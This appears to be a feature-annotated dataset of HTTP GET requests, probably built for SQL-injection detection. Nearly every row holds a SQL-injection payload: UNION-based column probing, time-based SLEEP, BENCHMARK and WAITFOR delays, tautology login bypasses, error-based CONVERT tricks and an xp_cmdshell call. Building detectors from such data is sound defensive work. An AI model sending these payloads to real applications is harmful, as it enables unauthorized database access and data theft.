108,2,200,4153,46,14,21,1,1,GET ?mail= UNION SELECT @@VERSION_SLEEP(5)_USER()_BENCHMARK(1000000_MD5('A'))_5_6&pass=') or true-- HTTP/1.1
273,2,200,1811,148,7,29,1,1,GET ?phone= UNION ALL SELECT 'INJ'||'ECT'||'XXX'_2_3_4_5_6_7_8_9_10_11_12_13_14_15_16_17_18&id= UNION ALL SELECT @@VERSION_USER()_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL--  HTTP/1.1
136,1,200,6161,46,8,15,1,1,GET ?password= UNION SELECT @@VERSION_SLEEP(5)_USER()_BENCHMARK(1000000_MD5('A'))_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19_20_21 HTTP/1.1
138,1,200,3707,46,4,15,1,1,GET ?pass= UNION SELECT @@VERSION_SLEEP(5)_USER()_BENCHMARK(1000000_MD5('A'))_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19_20_21_22_23 HTTP/1.1
104,2,200,3496,21,31,14,1,1,GET ?name= UNION ALL SELECT 1_2_3_4_5_6_7_8_9_10_11&phone=_(select * from (select(sleep(10)))a) HTTP/1.1
122,2,200,4131,24,68,9,1,1,GET ?username=select versionnumber_ version_timestamp from sysibm.sysversions;&pass= AS INJECTX WHERE 1=1 AND 1=0 HTTP/1.1
98,2,200,6802,49,10,20,1,1,GET ?name=-1 UNION SELECT 1 INTO @_@_@&phone=AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)-- HTTP/1.1
89,2,200,6808,42,7,23,1,1,GET ?tel= UNION ALL SELECT 'INJ'||'ECT'||'XXX'_2&name=';WAITFOR DELAY '0:0:30'-- HTTP/1.1
30,1,200,4997,7,6,10,1,1,GET ?id=') or ('a'='a HTTP/1.1
135,2,200,4477,38,12,16,1,1,GET ?username= ORDER BY 1_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_4_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19#&pass= ORDER BY 24--  HTTP/1.1
165,2,200,5670,53,7,27,1,1,GET ?name= UNION ALL SELECT 'INJ'||'ECT'||'XXX'_2_3_4_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19_20_21_22_23_24#&tel= UNION ALL SELECT 'INJ'||'ECT'||'XXX'_2_3# HTTP/1.1
197,2,200,2072,54,12,26,1,1,GET ?username= ORDER BY 1_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_4_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19_20_21_22_23_24#&pass= UNION ALL SELECT 'INJ'||'ECT'||'XXX'_2_3_4_5_6_7_8_9_10_11--  HTTP/1.1
60,1,200,2116,21,4,5,1,1,GET ?user= UNION ALL SELECT 1_2_3_4_5_6_7_8_9_10--  HTTP/1.1
74,2,200,1432,9,27,15,1,1,GET ?name=' or benchmark(10000000_MD5(1))#&phone=") or sleep(5)=" HTTP/1.1
149,2,200,4305,30,14,21,2,1,GET ?name=admin") or ("1"="1"/*&tel= UNION ALL SELECT 'INJ'||'ECT'||'XXX'_2_3_4_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19_20_21_22_23_24_25--  HTTP/1.1
91,2,200,4732,7,56,13,1,1,GET ?email=select current server from sysibm.sysdummy1;&phone=")) or pg_sleep(5)-- HTTP/1.1
149,2,200,6405,85,9,22,1,1,GET ?email= UNION ALL SELECT @@VERSION_USER()_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL-- &pass= '-' HTTP/1.1
32,1,200,6122,12,6,6,1,1,GET ?user=or SLEEP(5)=" HTTP/1.1
93,1,200,2805,24,22,8,1,1,GET ?mail=1234 ' AND 1=0 UNION ALL SELECT 'admin'_ '81dc9bdb52d04dc20036dbd8313ed055 HTTP/1.1
58,2,200,7177,21,13,8,1,1,GET ?phone= UNION ALL SELECT 1_2_3&id=' or true-- HTTP/1.1
151,2,200,7974,46,13,21,1,1,GET ?account='="or'&pass= UNION SELECT @@VERSION_SLEEP(5)_USER()_BENCHMARK(1000000_MD5('A'))_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19_20_21_22# HTTP/1.1
28,2,200,3484,7,6,4,1,1,GET ?code=" or ""&" HTTP/1.1
30,1,200,5761,14,2,3,1,1,GET ?id= ORDER BY 24  HTTP/1.1
209,2,200,1911,101,21,30,1,1,GET ?email= AND (SELECT 4523 FROM(SELECT COUNT(*)_CONCAT(0x716a7a6a71_(SELECT (ELT(4523=4523_1)))_0x71706a6b71_FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)&pass=or SLEEP(5)# HTTP/1.1
30,1,200,3736,7,6,6,1,1,GET ?mail=" or 1=1 -- HTTP/1.1
133,2,200,6293,46,4,19,1,1,GET ?id= UNION SELECT @@VERSION_SLEEP(5)_USER()_BENCHMARK(1000000_MD5('A'))_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19_20#&id== HTTP/1.1
154,2,200,7624,46,23,22,1,1,GET ?account=waitfor delay '00:00:05'&pass= UNION SELECT @@VERSION_SLEEP(5)_USER()_BENCHMARK(1000000_MD5('A'))_5_6_7_8_9_10_11_12_13_14_15_16_17# HTTP/1.1
223,2,200,7491,141,9,20,1,1,GET ?phone=" or 0=0 –&id= UNION ALL SELECT @@VERSION_USER()_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL--  HTTP/1.1
33,1,200,6500,7,11,4,1,1,GET ?account=" or "x"="x HTTP/1.1
132,2,200,5595,38,7,15,1,1,GET ?tel= ORDER BY 13-- &name= ORDER BY 1_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_4_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19_20 HTTP/1.1
104,2,200,5966,30,10,21,1,1,GET ?id=") or ("x")=("x&pass= UNION ALL SELECT 'INJ'||'ECT'||'XXX'_2_3_4_5_6_7_8_9_10_11_12_13# HTTP/1.1
51,2,200,6113,7,22,9,1,1,GET ?mail=admin' or 1=1&pass=admin' or 1=1 HTTP/1.1
34,1,200,4551,14,4,5,1,1,GET ?mail= ORDER BY 26--  HTTP/1.1
34,1,200,4514,14,4,5,1,1,GET ?mail= ORDER BY 26--  HTTP/1.1
120,2,200,7236,24,35,13,2,1,GET ?email=admin' or '1'='1'/*&phone=1234 " AND 1=0 UNION ALL SELECT "admin"_ "81dc9bdb52d04dc20036dbd8313ed055 HTTP/1.1
214,2,200,6295,66,10,26,1,1,GET ?email= ORDER BY 1_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_4_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19_20_21_22_23_24_25_26_27_28_29_30-- &phone= AND 5650=CONVERT(INT_(UNION ALL SELECTCHAR(88) CHAR(88)))--  HTTP/1.1
69,2,200,2515,7,37,10,1,1,GET ?code=exec master..xp_cmdshell 'net view'&code=" or ""^" HTTP/1.1
31,1,200,1922,13,5,4,1,1,GET ?email= HAVING 1=1 HTTP/1.1
53,2,200,6347,21,7,6,1,1,GET ?tel= ORDER BY 16 &name= ORDER BY 31337# HTTP/1.1
176,2,200,2464,46,9,20,2,1,GET ?tel= UNION SELECT @@VERSION_SLEEP(5)_USER()_BENCHMARK(1000000_MD5('A'))_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19_20_21_22_23_24_25_26_27_28_29#&name=" or "1"="1"/* HTTP/1.1
31,1,200,5417,14,4,3,1,1,GET ?pass= ORDER BY 8  HTTP/1.1
103,2,200,4688,21,11,16,1,1,GET ?name=') or '1'='1'--&phone= UNION ALL SELECT 1_2_3_4_5_6_7_8_9_10_11_12_13_14_15_16_17--  HTTP/1.1
35,1,200,4158,7,13,8,1,1,GET ?phone=' or 'one'='one HTTP/1.1
210,2,200,6006,45,4,14,1,1,GET ?id= UNION ALL SELECT 1_2_3_4_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19_20_21_22_23_24&id= ORDER BY 1_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_4_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19_20_21_22_23_24_25# HTTP/1.1
126,2,200,6244,46,8,18,1,1,GET ?code= UNION SELECT @@VERSION_SLEEP(5)_USER()_BENCHMARK(1000000_MD5('A'))_5_6_7_8_9_10_11_12_13_14_15_16&code="-" HTTP/1.1
135,2,200,4334,31,14,17,2,1,GET ?phone=admin" or 1=1/*&id= ORDER BY 1_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_4_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19_20--  HTTP/1.1
126,2,200,4593,21,18,7,2,1,GET ?account= UNION ALL SELECT 1_2_3_4_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19_20_21_22_23_24_25&pass=admin" or 1=1/* HTTP/1.1
20,1,200,3136,7,2,4,1,1,GET ?id="^" HTTP/1.1
20,1,200,7644,7,2,4,1,1,GET ?id="^" HTTP/1.1
20,1,200,2236,7,2,4,1,1,GET ?id="^" HTTP/1.1
48,2,200,5994,14,11,8,1,1,GET ?id= ORDER BY 8 &id=" or sleep(5)=" HTTP/1.1
126,2,200,2091,39,7,17,1,1,GET ?phone= WHERE 1=1 AND 1=0&id= ORDER BY 1_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_4_5_6_7_8_9_10_11_12_13_14_15_16--  HTTP/1.1
54,2,200,4115,7,17,16,2,1,GET ?phone=' and 1='1&id=admin') or '1'='1'/* HTTP/1.1
93,1,200,4818,30,4,13,1,1,GET ?code= UNION ALL SELECT 'INJ'||'ECT'||'XXX'_2_3_4_5_6_7_8_9_10_11_12_13_14_15_16 HTTP/1.1
161,2,200,6727,31,25,17,1,1,GET ?account=' or username like '%&pass= ORDER BY 1_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_4_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19_20_21_22_23_24_25_26# HTTP/1.1
55,1,200,7138,30,4,9,1,1,GET ?mail= UNION ALL SELECT USER()_SLEEP(5)--  HTTP/1.1
48,2,200,7914,7,15,10,1,1,GET ?account=' or 1=1 --&pass=" or ""=" HTTP/1.1
50,2,200,2431,7,20,10,1,1,GET ?username=') or true--&pass= or 0=0 – HTTP/1.1
229,1,200,7662,106,4,45,1,1,GET ?code= AND 5650=CONVERT(INT_(UNION ALL SELECTCHAR(73) CHAR(78) CHAR(74) CHAR(69) CHAR(67) CHAR(84) CHAR(88) CHAR(118) CHAR(120) CHAR(80) CHAR(75) CHAR(116) CHAR(69) CHAR(65) CHAR(113) CHAR(112) CHAR(106) CHAR(107)))# HTTP/1.1
148,2,200,5711,66,9,25,1,1,GET ?name= AND 5650=CONVERT(INT_(UNION ALL SELECTCHAR(88) CHAR(88)))-- &phone= ORDER BY 1_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_4_5_6_7_8_9# HTTP/1.1
113,1,200,5508,21,8,4,1,1,GET ?username= UNION ALL SELECT 1_2_3_4_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19_20_21_22_23_24_25_26_27# HTTP/1.1
108,2,200,3960,42,17,25,1,1,GET ?email= AND 5650=CONVERT(INT_(UNION ALL SELECTCHAR(88) CHAR(88)))-- &phone=admin') or '1'='1'-- HTTP/1.1
48,2,200,1048,14,14,8,1,1,GET ?mail= ORDER BY 24# &pass=or true-- HTTP/1.1
39,1,200,5465,7,13,5,1,1,GET ?mail=admin"or 1=1 or ""=" HTTP/1.1
52,1,200,1686,9,15,9,1,1,GET ?code=1) or benchmark(10000000_MD5(1))# HTTP/1.1
52,1,200,1202,9,15,9,1,1,GET ?code=1) or benchmark(10000000_MD5(1))# HTTP/1.1
158,2,200,1573,21,39,9,1,1,GET ?id=select session_user from sysibm.sysdummy1;&id= UNION ALL SELECT 1_2_3_4_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19_20_21_22_23_24_25_26_27_28--  HTTP/1.1
161,2,200,5093,70,9,27,1,1,GET ?email= ORDER BY 1_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_4_5_6_7_8_9_10-- &pass= UNION SELECT @@VERSION_SLEEP(5)_USER()_BENCHMARK(1000000_MD5('A'))_5 HTTP/1.1
55,1,200,2090,7,32,8,1,1,GET ?id=select current_setting('config_file'); HTTP/1.1
207,1,200,3558,78,9,59,1,1,GET ?phone= AND 3516=CAST((CHR(113)||CHR(106)||CHR(122)||CHR(106)||CHR(113))||(SELECT (CASE WHEN (3516=3516) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(112)||CHR(106)||CHR(107)||CHR(113)) AS NUMERIC) HTTP/1.1
59,2,200,5932,15,11,12,1,1,GET ?id=admin") or ("1"="1&id= WHERE 1=1 AND 1=0-- HTTP/1.1
26,1,200,3496,9,4,4,1,1,GET ?code= OR 1=1 HTTP/1.1
101,3,200,2013,24,25,13,1,1,GET ?name='&'&tel=1234 ' AND 1=0 UNION ALL SELECT 'admin'_ '81dc9bdb52d04dc20036dbd8313ed055 HTTP/1.1
196,2,200,7515,82,16,37,1,1,GET ?email= AND 5650=CONVERT(INT_(UNION ALL SELECTCHAR(73) CHAR(78) CHAR(74) CHAR(69) CHAR(67) CHAR(84) CHAR(88) CHAR(118) CHAR(120) CHAR(80) CHAR(75) CHAR(116)))#&pass=admin" or "1"="1"# HTTP/1.1
124,2,200,7086,30,11,18,1,1,GET ?email= or 0=0 –&pass= UNION ALL SELECT 'INJ'||'ECT'||'XXX'_2_3_4_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19_20--  HTTP/1.1
100,2,200,1977,31,26,15,1,1,GET ?code=Finding the table name&code= UNION ALL SELECT 'INJ'||'ECT'||'XXX'_2_3_4_5_6_7_8_9 HTTP/1.1
148,1,200,2092,46,2,15,1,1,GET ?id= UNION SELECT @@VERSION_SLEEP(5)_USER()_BENCHMARK(1000000_MD5('A'))_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19_20_21_22_23_24_25_26_27 HTTP/1.1
225,2,200,5411,98,9,47,1,1,GET ?phone=' or 1=1#&id= AND 5650=CONVERT(INT_(UNION ALL SELECTCHAR(73) CHAR(78) CHAR(74) CHAR(69) CHAR(67) CHAR(84) CHAR(88) CHAR(118) CHAR(120) CHAR(80) CHAR(75) CHAR(116) CHAR(69) CHAR(65) CHAR(113) CHAR(112)))--  HTTP/1.1
39,1,200,2519,7,17,6,1,1,GET ?password=' or uid like '% HTTP/1.1
84,2,200,2991,21,11,8,1,1,GET ?id= UNION ALL SELECT 1_2_3_4_5_6_7_8_9_10_11_12&id=admin") or "1"="1"# HTTP/1.1
117,2,200,3751,57,7,22,1,1,GET ?name= AND 5650=CONVERT(INT_(UNION ALL SELECTCHAR(88) CHAR(88) CHAR(88) CHAR(88)))-- &tel= ORDER BY 2--  HTTP/1.1
58,2,200,1631,12,26,9,1,1,GET ?phone=select * from pg_group;&id=or SLEEP(5) HTTP/1.1
47,2,200,1273,14,10,9,1,1,GET ?mail= ORDER BY 24# &pass=or 1=1-- HTTP/1.1
91,2,200,4557,37,9,18,1,1,GET ?name=1' ORDER BY 1_2_3-- &phone= UNION ALL SELECT 'INJ'||'ECT'||'XXX'_2_3_4_5 HTTP/1.1
138,2,200,4262,46,13,19,1,1,GET ?mail=admin" --&pass= UNION SELECT @@VERSION_SLEEP(5)_USER()_BENCHMARK(1000000_MD5('A'))_5_6_7_8_9_10_11_12_13_14_15_16_17_18 HTTP/1.1
34,1,200,6501,14,7,3,1,1,GET ?account= ORDER BY 3  HTTP/1.1
69,1,200,7942,21,4,5,1,1,GET ?pass= UNION ALL SELECT 1_2_3_4_5_6_7_8_9_10_11_12_13--  HTTP/1.1
24,1,200,4124,7,4,5,1,1,GET ?id=or 1=1# HTTP/1.1
82,1,200,7107,30,4,14,1,1,GET ?mail= UNION ALL SELECT 'INJ'||'ECT'||'XXX'_2_3_4_5_6_7_8_9_10_11_12# HTTP/1.1
110,2,200,3154,37,4,17,1,1,GET ?id= UNION ALL SELECT 'INJ'||'ECT'||'XXX'_2_3_4_5_6_7_8_9_10_11_12_13_14_15_16&id= ORDER BY 25--  HTTP/1.1
79,2,200,7568,30,16,16,1,1,GET ?email= UNION ALL SELECT USER()_SLEEP(5)-- &pass=")) or sleep(5)=" HTTP/1.1
44,2,200,1146,14,9,8,1,1,GET ?name= ORDER BY 11-- &phone="^" HTTP/1.1
38,1,200,2705,7,9,12,2,1,GET ?id=admin') or ('1'='1'/* HTTP/1.1
38,1,200,2319,7,9,12,2,1,GET ?id=admin') or ('1'='1'/* HTTP/1.1
103,1,200,2385,41,11,14,1,1,GET ?pass= RLIKE (SELECT (CASE WHEN (4346=4346) THEN 0x61646d696e ELSE 0x28 END)) AND 'Txws'=' HTTP/1.1
103,1,200,1512,41,11,14,1,1,GET ?pass= RLIKE (SELECT (CASE WHEN (4346=4346) THEN 0x61646d696e ELSE 0x28 END)) AND 'Txws'=' HTTP/1.1
84,2,200,5215,9,34,17,1,1,GET ?account=1 or benchmark(10000000_MD5(1))#&pass=;waitfor delay '0:0:5'-- HTTP/1.1
131,1,200,5698,77,7,17,1,1,GET ?account= UNION ALL SELECT @@VERSION_USER()_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_NULL_NULL_NULL_NULL_NULL_NULL_NULL--  HTTP/1.1
47,2,200,6512,7,13,12,1,1,GET ?tel=' or 1=1--&name=") or ("a"="a HTTP/1.1
89,2,200,2556,38,11,15,1,1,GET ?email= AND 5650=CONVERT(INT_(UNION ALL SELECTCHAR(88)))-- &pass=" or "1"="1 HTTP/1.1
34,1,200,7160,7,10,6,1,1,GET ?username=" or 0=0 -- HTTP/1.1
26,1,200,2817,7,8,4,1,1,GET ?username="*" HTTP/1.1
164,2,200,2998,31,27,18,1,1,GET ?mail= ORDER BY 1_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_4_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19_20_21_22_23_24_25#&pass=' group by userid having 1=1-- HTTP/1.1
250,2,200,2421,69,10,29,1,1,GET ?email= UNION ALL SELECT 'INJ'||'ECT'||'XXX'_2_3_4_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19_20_21_22-- &phone= UNION SELECT @@VERSION_SLEEP(5)_USER()_BENCHMARK(1000000_MD5('A'))_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19_20_21_22_23_24_25_26 HTTP/1.1
197,2,200,6438,84,8,37,1,1,GET ?code= AND 7506=9091 AND ('5913=5913&code= AND 5650=CONVERT(INT_(UNION ALL SELECTCHAR(73) CHAR(78) CHAR(74) CHAR(69) CHAR(67) CHAR(84) CHAR(88) CHAR(118) CHAR(120) CHAR(80) CHAR(75)))# HTTP/1.1
299,2,200,4884,133,8,60,1,1,GET ?mail= UNION ALL SELECT 'INJ'||'ECT'||'XXX'_2_3_4_5_6_7_8_9#&pass= AND 5650=CONVERT(INT_(UNION ALL SELECTCHAR(73) CHAR(78) CHAR(74) CHAR(69) CHAR(67) CHAR(84) CHAR(88) CHAR(118) CHAR(120) CHAR(80) CHAR(75) CHAR(116) CHAR(69) CHAR(65) CHAR(113) CHAR(112) CHAR(106) CHAR(107) CHAR(113)))# HTTP/1.1
49,2,200,5961,14,11,9,1,1,GET ?name=' or 1=1;#&phone= ORDER BY 17  HTTP/1.1
215,1,200,2763,98,8,42,1,1,GET ?password= AND 5650=CONVERT(INT_(UNION ALL SELECTCHAR(73) CHAR(78) CHAR(74) CHAR(69) CHAR(67) CHAR(84) CHAR(88) CHAR(118) CHAR(120) CHAR(80) CHAR(75) CHAR(116) CHAR(69) CHAR(65) CHAR(113) CHAR(112)))--  HTTP/1.1
199,2,200,4789,35,11,7,1,1,GET ?account= UNION ALL SELECT 1_2_3_4_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19_20_21_22_23_24_25#&pass= UNION ALL SELECT 1_2_3_4_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19_20_21_22_23_24_25_26# HTTP/1.1
169,2,200,6039,45,7,16,1,1,GET ?tel= UNION ALL SELECT 1_2_3_4_5#&name= ORDER BY 1_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_4_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19_20_21_22_23_24_25_26_27--  HTTP/1.1
209,1,200,2449,141,5,17,1,1,GET ?email= UNION ALL SELECT @@VERSION_USER()_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL--  HTTP/1.1
61,2,200,4908,7,17,19,1,1,GET ?mail=") or ("1"="1"--&pass=admin') or '1'='1'-- HTTP/1.1
32,1,200,3108,14,4,4,1,1,GET ?mail= ORDER BY 9#  HTTP/1.1
97,2,200,5380,44,19,21,1,1,GET ?username=AND (SELECT * FROM (SELECT(SLEEP(5)))bAKL) AND 'vRxe'='vRxe&pass=SLEEP(5)# HTTP/1.1
49,1,200,3777,7,20,11,1,1,GET ?password=");waitfor delay '0:0:5'-- HTTP/1.1
37,1,200,3868,14,7,4,2,1,GET login/?id= ORDER BY 23#  HTTP/1.1
154,2,200,6752,46,10,19,1,1,GET ?id=" or "x"="x&pass= UNION SELECT @@VERSION_SLEEP(5)_USER()_BENCHMARK(1000000_MD5('A'))_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19_20_21_22_23# HTTP/1.1
45,2,200,1995,14,10,6,1,1,GET ?code= or 1=1&code= ORDER BY 20  HTTP/1.1
55,2,200,2348,7,26,11,1,1,GET ?phone=select @@servernamee&id=' or '1′='1 HTTP/1.1
47,2,200,3449,7,13,8,2,1,GET ?email=" or "1"="1"/*&pass= or 1=1 HTTP/1.1
130,2,200,6483,46,13,27,1,1,GET ?account=') or ('1'='1'#&pass= UNION SELECT @@VERSION_SLEEP(5)_USER()_BENCHMARK(1000000_MD5('A'))_5_6_7_8_9_10_11_12# HTTP/1.1
23,1,200,2438,7,5,4,1,1,GET ?email='\" HTTP/1.1
51,2,200,1137,19,14,8,1,1,GET ?email=admin" #&pass=ORDER BY SLEEP(5) HTTP/1.1
35,1,200,5293,14,4,6,1,1,GET ?pass=1' ORDER BY 3--  HTTP/1.1
35,1,200,2702,14,4,6,1,1,GET ?pass=1' ORDER BY 3--  HTTP/1.1
59,2,200,3782,19,15,10,1,1,GET ?code=admin' or 1=1&code= ORDER BY 1_SLEEP(5)# HTTP/1.1
41,1,200,2260,7,14,6,1,1,GET ?account=admin") or "1"="1"# HTTP/1.1
165,2,200,6029,31,38,15,1,1,GET ?email= ORDER BY 1_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_4_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19_20_21_22_23_24&pass=select grantee from syscat.dbauth; HTTP/1.1
204,2,200,2028,117,21,22,1,1,GET ?username=' or uid like '%&pass= UNION ALL SELECT @@VERSION_USER()_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL--  HTTP/1.1
34,1,200,2027,9,7,11,1,1,GET ?email=' OR 'x'='x'#; HTTP/1.1
34,1,200,4662,9,7,11,1,1,GET ?email=' OR 'x'='x'#; HTTP/1.1
107,2,200,4922,38,7,14,1,1,GET ?tel= ORDER BY 10 &name= ORDER BY 1_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_4_5_6_7_8_9_10_11_12# HTTP/1.1
58,2,200,5407,7,31,10,1,1,GET ?phone=select current_setting('port');&id=" " HTTP/1.1
81,2,200,7562,21,14,14,1,1,GET ?email= UNION ALL SELECT 1_2_3_4_5_6_7_8_9&phone=")) or (("x"))=(("x HTTP/1.1
80,1,200,7157,30,2,14,1,1,GET ?id= UNION ALL SELECT 'INJ'||'ECT'||'XXX'_2_3_4_5_6_7_8_9_10_11_12# HTTP/1.1
80,1,200,2410,30,2,14,1,1,GET ?id= UNION ALL SELECT 'INJ'||'ECT'||'XXX'_2_3_4_5_6_7_8_9_10_11_12# HTTP/1.1
33,1,200,4901,14,5,3,1,1,GET ?email= ORDER BY 15  HTTP/1.1
57,1,200,6882,30,5,13,1,1,GET ?email= UNION ALL SELECT 'INJ'||'ECT'||'XXX' HTTP/1.1
141,2,200,1116,35,9,5,1,1,GET ?name= UNION ALL SELECT 1_2_3_4_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19_20_21_22_23_24_25_26&phone= UNION ALL SELECT 1_2_3_4_5_6 HTTP/1.1
78,2,200,1177,21,4,8,1,1,GET ?id= UNION ALL SELECT 1_2_3_4_5_6_7_8_9_10_11_12_13_14_15-- &id== HTTP/1.1
237,1,200,2879,105,2,45,1,1,GET ?id= UNION ALL SELECT CHAR(113) CHAR(106) CHAR(122) CHAR(106) CHAR(113) CHAR(110) CHAR(106) CHAR(99) CHAR(73) CHAR(66) CHAR(109) CHAR(119) CHAR(81) CHAR(108) CHAR(88) CHAR(113) CHAR(112) CHAR(106) CHAR(107) CHAR(113)_NULL--  HTTP/1.1
120,2,200,7722,21,11,13,1,1,GET ?email= UNION ALL SELECT 1_2_3_4_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19_20_21_22_23_24#&pass=') or ('1'='1 HTTP/1.1
56,2,200,7037,15,14,9,1,1,GET ?username= or 1=1–&pass= WHERE 1=1 AND 1=0# HTTP/1.1
39,1,200,1584,19,5,6,1,1,GET ?phone= ORDER BY SLEEP(5)# HTTP/1.1
37,1,200,1925,14,8,4,1,1,GET ?username= ORDER BY 24#  HTTP/1.1
109,1,200,6408,21,4,4,1,1,GET ?mail= UNION ALL SELECT 1_2_3_4_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19_20_21_22_23_24_25_26_27# HTTP/1.1
44,1,200,2908,7,16,10,1,1,GET ?code=";waitfor delay '0:0:5'-- HTTP/1.1
330,2,200,2111,130,7,57,1,1,GET ?phone= AND 5650=CONVERT(INT_(UNION ALL SELECTCHAR(73) CHAR(78) CHAR(74) CHAR(69) CHAR(67) CHAR(84) CHAR(88) CHAR(118) CHAR(120) CHAR(80) CHAR(75) CHAR(116) CHAR(69) CHAR(65) CHAR(113) CHAR(112) CHAR(106) CHAR(107)))-- &id= ORDER BY 1_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_4_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19_20# HTTP/1.1
87,2,200,7293,8,42,21,1,1,GET ?code= and (select substring(@@version_1_1))='M'&code=')) or pg_sleep(5)-- HTTP/1.1
52,1,200,4993,26,8,7,1,1,GET ?password= UNION ALL SELECT SLEEP(5)--  HTTP/1.1
185,2,200,4774,105,13,26,1,1,GET ?account=') or ('1'='1&pass= UNION ALL SELECT @@VERSION_USER()_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL--  HTTP/1.1
104,2,200,6663,28,6,7,1,1,GET ?id= UNION ALL SELECT 1_2_3_4_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19-- &pass= ORDER BY 30  HTTP/1.1
80,1,200,1190,39,5,14,2,1,GET ?email=AND 2947=LIKE('ABCDEFG'_UPPER(HEX(RANDOMBLOB(500000000/2)))) HTTP/1.1
